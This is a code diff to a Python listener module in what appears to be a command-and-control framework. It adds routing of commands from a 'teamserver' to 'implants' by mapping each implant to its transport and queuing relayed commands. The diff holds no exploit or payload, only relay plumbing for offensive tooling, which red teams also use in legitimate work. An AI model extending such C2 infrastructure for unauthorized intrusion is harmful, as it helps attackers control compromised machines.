@@ -1,6 +1,17 @@
 from lib import instructions
-from lib.crypto import asymmetric
 from lib import transmit
+from lib import implants
+from lib.crypto import asymmetric
+
+
+def _get_transport_index(listener, transport_id):
+    try:
+        transport_index = next(index for (index, transport) in enumerate(listener.transports) if transport.transport_id == transport_id)
+        return transport_index
+    except StopIteration:
+        listener.logging.log(f"{transport_id} not found!",
+                             level="error", source="lib.implants")
+        pass
 
 
 def send_manifest(frame, listener):
@@ -78,10 +89,24 @@ def request_command(listener):
 
 
 def receive_command(frame, listener):
-    # TODO: add the command to the implant's queue
-    data = {'component_id': listener.component_id, "txid": frame['txid'], "cmd": "rcok", "args":[{"lpk": listener.current_public_key._public_key}]}
+    cmd_txids = []
+    # Loop through each command in the list of received commands
     for command in frame['args'][0]:
+        # First we get the index of the implant
+        implant_index = implants._get_implant_index(listener, command['component_id'])
+        # Now we can use that to set the implant's transport's ID in the command:
+        command['transport_id'] = listener.implants[implant_index]['transport_id']
+        # Now we'll ensure that the implant_id is set on the transport
+        #  First we'll need the transport's index
+        transport_index = _get_transport_index(listener, command['transport_id'])
+        # Finally, we'll set the implant_id in the transport, we'll do this every time
+        listener.transports[transport_index].implant_id = command['component_id']
+        # Set the command state to "RELAYING"
+        command['state'] = "RELAYING"
         listener.cmd_queue.append(command)
+        cmd_txids.append(command['txid'])
+    data = {'component_id': listener.component_id, "txid": frame['txid'], "cmd": "rcok",
+            "args": [{"cmd_txids": cmd_txids}, {"lpk": listener.current_public_key._public_key}]}
     listener.current_ts_pubkey = asymmetric.public_key_from_bytes(str(frame['args'][1]['tpk']))
     instruction_frame = instructions.create_instruction_frame(data)
     reply_frame = transmit.cook_transmit_frame(listener, instruction_frame, "teamserver")
